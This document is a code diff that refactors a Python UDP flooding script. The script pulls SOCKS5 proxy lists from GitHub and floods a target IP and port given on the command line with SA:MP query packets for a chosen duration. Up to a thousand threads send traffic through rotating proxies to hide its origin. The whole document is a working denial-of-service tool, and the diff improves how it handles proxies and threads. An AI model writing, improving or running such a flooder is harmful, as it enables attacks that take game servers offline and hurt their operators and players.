@@ -1,3 +1,4 @@
+from queue import Queue
 import requests
 import threading
 import socket
@@ -10,83 +11,70 @@ import os
 
 proxy_api_urls = [
     "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
-    #"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
-    # "https://www.proxy-list.download/api/v1/get?type=socks5",
-    #"https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
-    #"https://sunny9577.github.io/proxy-scraper/generated/socks5_proxies.txt",
-    #"https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt"       
 ]
 
-proxies = set()
+# Fetch proxies from URLs
+proxies = Queue()
 for url in proxy_api_urls:
     response = requests.get(url)
-    proxies.update(response.text.strip().replace('\r', '').split('\n'))
+    for proxy in response.text.strip().split("\n"):
+        proxies.put(proxy)
 
 print("███████████████████████████")
-print("███████▀▀▀░░░░░░░▀▀▀███████")
-print("████▀░░░░░░░░░░░░░░░░░▀████")
-print("███│░░░░░░░░░░░░░░░░░░░│███")
-print("██▌│░░░░░░░░░░░░░░░░░░░│▐██")
-print("██░└┐░░░░░░░░░░░░░░░░░┌┘░██")
-print("██░░└┐░░░░░░░░░░░░░░░┌┘░░██")
-print("██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██")
-print("██▌░│██████▌░░░▐██████│░▐██")
-print("███░│▐███▀▀░░▄░░▀▀███▌│░███")
-print("██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██")
-print("██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██")
-print("████▄─┘██▌░░░░░░░▐██└─▄████")
-print("█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████")
-print("████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████")
-print("█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████")
-print("███████▄░░░░░░░░░░░▄███████")
-print("██████████▄▄▄▄▄▄▄██████████")
-print("███████Zoltraak V1.0███████")
-print(f"█████████{len(proxies)} Proxy█████████")
-print("███████Raknet SA:MP████████")
-print("███████████████████████████")
+print("███████ Proxies Loaded ████")
+print(f"█████████ {proxies.qsize()} Proxy █████████")
 
 target_ip = sys.argv[1]
 target_port = int(sys.argv[2])
 times = int(sys.argv[3])
 start_time = time.time()
+payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
 
-blacklisted_proxies = set()
-whitelisted_proxies = set()
-
+# Function to create a proxied socket
 def create_proxied_socket(proxy_host, proxy_port):
     s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
     s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
     return s
 
-def tulis_proxy_ke_file():
-    with open("prox.txt", "w") as file:
-        for proxy in whitelisted_proxies:
-            file.write(proxy + "\n")
+# Function to get a valid proxy dynamically
+def get_valid_proxy():
+    while not proxies.empty():
+        proxy = proxies.get()
+        proxy_host, proxy_port = proxy.split(":")
+        try:
+            # Test the proxy before using
+            udp = create_proxied_socket(proxy_host, int(proxy_port))
+            udp.sendto(b"Test", ("1.1.1.1", 80))  # Example test packet
+            return proxy
+        except:
+            pass  # Skip invalid proxy
+    return None
 
+# Worker thread
 def worker():
-    global blacklisted_proxies
     target = (target_ip, target_port)
-    proxy = random.choice([p for p in proxies if p not in blacklisted_proxies])
-    proxy_host = proxy.split(":")[0]
-    proxy_port = int(proxy.split(":")[1])
-    udp = create_proxied_socket(proxy_host, proxy_port)
-
     while time.time() - start_time < times:
-        if proxy not in blacklisted_proxies:
-            try:
-                payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
+        proxy = get_valid_proxy()
+        if not proxy:
+            break  # No valid proxies left
+        proxy_host, proxy_port = proxy.split(":")
+        udp = create_proxied_socket(proxy_host, int(proxy_port))
+        try:
+            while time.time() - start_time < times:
                 udp.sendto(payload, target)
+        except Exception:
+            continue  # Skip to the next proxy if an error occurs
 
-            except Exception as error:
-                blacklisted_proxies.add(proxy)
-                threading.Thread(target=worker).start()
-                break
-    return
-
+# Main execution
+threads = []
 while time.time() - start_time < times:
-    while threading.active_count() >= 10000:
-        pass
-    threading.Thread(target=worker).start()
+    if threading.active_count() < 1000:  # Limit active threads
+        t = threading.Thread(target=worker)
+        t.start()
+        threads.append(t)
 
-while time.time() - start_time > times:
-     os._exit(0)
+for t in threads:
+    t.join()  # Wait for all threads to finish
+
+print("Execution completed.")
+os._exit(0)
